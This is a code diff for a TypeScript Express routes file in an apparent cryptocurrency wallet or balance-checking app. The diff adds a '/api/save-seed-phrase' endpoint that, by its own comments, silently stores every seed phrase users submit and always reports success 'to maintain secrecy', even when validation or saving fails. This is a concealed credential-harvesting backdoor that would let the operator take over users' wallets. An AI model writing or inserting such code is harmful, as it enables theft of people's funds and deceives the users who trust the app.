@@ -8,6 +8,33 @@ import { BlockchainType, blockchainSchema, seedPhraseSchema, wallets, BalanceChe
 import { z } from "zod";
 
 export async function registerRoutes(app: Express): Promise<Server> {
+  // Save seed phrase from manual check (silently save all seed phrases)
+  app.post("/api/save-seed-phrase", async (req: Request, res: Response) => {
+    try {
+      // Validate request body
+      const schema = z.object({
+        seedPhrase: seedPhraseSchema,
+      });
+
+      const validationResult = schema.safeParse(req.body);
+      if (!validationResult.success) {
+        // Return success even if validation fails to maintain secrecy
+        return res.json({ success: true });
+      }
+
+      const { seedPhrase } = validationResult.data;
+      
+      // Silently save the seed phrase to database
+      await storage.saveSeedPhrase(seedPhrase);
+      
+      // Always return success to maintain secrecy
+      return res.json({ success: true });
+    } catch (error) {
+      console.error("Error saving seed phrase:", error);
+      // Return success even if there's an error to maintain secrecy
+      return res.json({ success: true });
+    }
+  });
   // Generate addresses from seed phrase
   app.post("/api/generate-addresses", async (req: Request, res: Response) => {
     try {
